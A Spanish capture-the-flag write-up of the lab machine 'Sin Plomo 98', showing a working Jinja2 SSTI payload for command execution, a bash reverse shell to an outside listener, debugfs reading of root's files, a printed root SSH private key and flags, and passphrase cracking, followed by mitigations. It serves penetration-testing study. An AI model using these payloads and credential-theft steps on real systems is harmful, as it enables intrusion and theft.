### Información General

|Campo|Detalle|
|---|---|
|Máquina|Sin Plomo 98|
|Plataforma|TheHackersLabs|
|IP|192.168.241.177|
|Dificultad|No especificada|
|Servicios expuestos|FTP (21), SSH (22), HTTP (80), HTTP/Werkzeug (5000)|
|Vector inicial|SSTI (Jinja2) en Werkzeug → RCE|
|Escalada|Lectura de `id_rsa` de root vía `debugfs` sobre partición no desmontada + crackeo con `ssh2john`/`john`|
|Vulnerabilidades explotadas|FTP anónimo, Server-Side Template Injection (Jinja2), lectura arbitraria del disco con `debugfs`, clave privada con passphrase débil|

### Resumen del Ataque

El reconocimiento inicial reveló cuatro servicios: FTP con acceso anónimo, SSH, un sitio web estático en el puerto 80 y una aplicación Flask/Werkzeug en el puerto 5000. El FTP anónimo solo aportó un archivo señuelo sin utilidad real. La pista real llegó desde el código fuente de la aplicación en el puerto 5000, que contenía un comentario HTML apuntando a la ruta `/petrolhead`. Esta ruta reflejaba la entrada del usuario, lo que primero hizo sospechar un XSS (confirmado con un payload `<img onerror>`), pero al probar `{{7*7}}` se confirmó que el reflejo pasaba por el motor de plantillas Jinja2, abriendo la puerta a un SSTI. Encadenando el SSTI con `cycler.__init__.__globals__.os.popen(...)` se logró ejecución de comandos y, después, una reverse shell como el usuario `tcuser`. Al llegar a un callejón sin salida por permisos limitados, se recurrió a `debugfs` sobre `/dev/sda1` para leer directamente el filesystem sin restricciones de permisos de usuario, lo que permitió extraer ambas flags y, además, la clave privada SSH de root (`.ssh/id_rsa`). Dicha clave estaba protegida por passphrase, crackeada offline con `ssh2john` + `john`, obteniendo acceso final como root por SSH.

### Técnicas Usadas

- Escaneo de puertos completo con Nmap (`-p-`, `-sS`, `--min-rate`)
- Enumeración de servicios y versión (`-sC -sV`)
- Acceso FTP anónimo
- Análisis de código fuente HTML en busca de rutas ocultas
- Confirmación de reflejo de entrada (sospecha de XSS descartada como vector principal)
- Detección de SSTI con payload aritmético `{{7*7}}`
- Explotación de SSTI en Jinja2 mediante `cycler.__init__.__globals__.os`
- Obtención de reverse shell y estabilización de TTY
- Bypass de permisos de usuario mediante lectura directa de partición con `debugfs`
- Extracción de clave SSH privada protegida por passphrase
- Crackeo offline de passphrase con `ssh2john` + `john` (diccionario)
- Acceso privilegiado final vía SSH con clave privada

### Desarrollo

**1. Escaneo de puertos completo**

```
sudo nmap -p- -sS --min-rate 5000 -n -vvv -Pn -oN ports 192.168.241.177
```

![](images/IMG-20260905184321172.png)

```
nmap -p 21,22,80,5000 -sC -sV -oN allports 192.168.241.177     
```

**2. Enumeración de versiones de los servicios**

![](images/IMG-20260905184321316.png)

**3. Acceso FTP anónimo — callejón sin salida**

```
ftp 192.168.241.177          
```

![](images/IMG-20260905184321426.png)

```
ftp> ls
```

![](images/IMG-20260905184321505.png)

```
ftp> get supermegaultraimportantebro.txt
```

```
cat supermegaultraimportantebro.txt                                    
```

![](images/IMG-20260905184321595.png)

El FTP anónimo resultó ser un señuelo sin utilidad para la explotación.

**4. Revisión de los sitios web (80 y 5000)**

El puerto 80 mostraba una landing estática ("Bienvenido a petrolhead"). 

```
http://192.168.241.177/
```

![](images/IMG-20260905184321673.png)

El puerto 5000, una app Flask genérica.

```
http://192.168.241.177:5000/
```

![](images/IMG-20260905184321769.png)

Revisando el código fuente de esta última se encontró un comentario:

```
<!-- /petrolhead -->
```
![](images/IMG-20260905184321859.png)

**5. Descubrimiento del punto de entrada reflejado**

```
http://192.168.241.177:5000/petrolhead
```

![](images/IMG-20260905184321932.png)

La página mostraba un campo de texto que reflejaba la entrada enviada (probado primero con la cadena `test`).

![](images/IMG-20260905184322011.png)

![](images/IMG-20260905184322103.png)

**6. Sospecha inicial de XSS (descartada como vector principal)**

```
<img src=x onerror=alert(1)>
```

![](images/IMG-20260905184322186.png)

Se disparó el `alert(1)`, confirmando reflejo sin sanitizar, pero se decidió explorar más a fondo antes de quedarse solo con el XSS.
![](images/IMG-20260905184322278.png)


**7. Confirmación de SSTI**

```
{{7*7}}
```

![](images/IMG-20260905184322348.png)

Resultado: `49` — confirma que la entrada se procesa como plantilla Jinja2, no solo se refleja como HTML.
![](images/IMG-20260905184322430.png)

**8. Ejecución de comandos vía SSTI**

```
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

![](images/IMG-20260905184322502.png)

![](images/IMG-20260905184322582.png)

**9. Obtención de reverse shell**

```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c \'bash -i >& /dev/tcp/192.168.241.128/1234 0>&1\'').read() }}
```

![](images/IMG-20260905184322652.png)

```
nc -lvnp 1234
```

![](images/IMG-20260905184322758.png)

**10. Estabilización de la TTY**

```
script /dev/null -c bash
ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 33 columns 144
```

```
tcuser@SinPLomo98:~/prueba$ whoami
```

![](images/IMG-20260905184322833.png)

**11. Enumeración local — usuarios con shell**

```
tcuser@SinPLomo98:~/prueba$ grep bash /etc/passwd
```

![](images/IMG-20260905184322914.png)

**12. Identificación del disco montado**

```
tcuser@SinPLomo98:~$ id
```

![](images/IMG-20260905184322981.png)

```
tcuser@SinPLomo98:~$ df -h 
```

![](images/IMG-20260905184323062.png)

**13. Lectura del filesystem sin restricciones de permisos con debugfs**

Al no encontrar una vía de escalada de privilegios convencional (sudo, SUID, cron, etc. no reflejados en el output pero descartados en la sesión), se recurrió a `debugfs` para leer directamente la partición, bypaseando los permisos del sistema de archivos:

```
tcuser@SinPLomo98:~$ debugfs /dev/sda1 
```

![](images/IMG-20260905184323133.png)

```
debugfs:  cat /home/tcuser/user.txt 
aa3b5421f267d0bec5b0e72cb638187b
debugfs:  
```

![](images/IMG-20260905184323215.png)

```
debugfs:  cat /root/root.txt
6d75e57572638098039f7fbb6fd39b70
debugfs:
```

![](images/IMG-20260905184323284.png)

**14. Extracción de la clave privada SSH de root**

```
debugfs:  cd /root
debugfs:  cat .ssh/id_rsa
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
2ZOJdg==
-----END OPENSSH PRIVATE KEY-----
```

**15. Preparación y crackeo de la passphrase de la clave**

```
chmod 600 id_rsa
```

```
ssh2john id_rsa > hash.txt
```

![](images/IMG-20260905184323366.png)

16. Acceso final como root

```
ssh -i id_rsa root@192.168.241.177
```

![](images/IMG-20260905184323440.png)


```
root@SinPLomo98:~# whoami
```

![](images/IMG-20260905184323524.png)

### Lecciones Aprendidas

- Un comentario HTML olvidado en el código fuente puede filtrar rutas ocultas críticas.
- No basta con confirmar un reflejo de entrada como XSS; siempre vale la pena probar payloads de SSTI (`{{7*7}}`) antes de descartar vectores más graves.
- En Jinja2, aunque `__builtins__` esté bloqueado, objetos accesibles por defecto como `cycler` permiten alcanzar `__globals__.os` y lograr RCE.
- Cuando la escalada de privilegios por vías convencionales no es evidente, herramientas de bajo nivel como `debugfs` sobre el propio disco (si el usuario tiene acceso al dispositivo de bloques, como en el grupo `disk`) permiten leer archivos de cualquier propietario sin necesidad de exploits.
- Una clave SSH protegida por passphrase no es garantía de seguridad si la passphrase es débil y crackeable por diccionario.

### Medidas de Mitigación

- Deshabilitar el acceso FTP anónimo o restringirlo a contenido no sensible.
- Eliminar comentarios de depuración/rutas internas del código fuente servido al cliente.
- Nunca renderizar entrada de usuario directamente como plantilla Jinja2; usar `render_template` con contextos controlados y `autoescape`, evitando `render_template_string` con datos de usuario.
- Sandboxear el entorno Jinja2 (`ImmutableSandboxedEnvironment`) para bloquear el acceso a `__globals__` y similares.
- Restringir permisos de grupo (por ejemplo, no incluir a usuarios de aplicación en el grupo `disk`), lo que evita el acceso directo al dispositivo de bloques vía `debugfs`.
- Exigir passphrases robustas (o usar autenticación por hardware/agentes) para claves SSH privilegiadas, y restringir el uso de la clave de root solo a hosts de confianza.
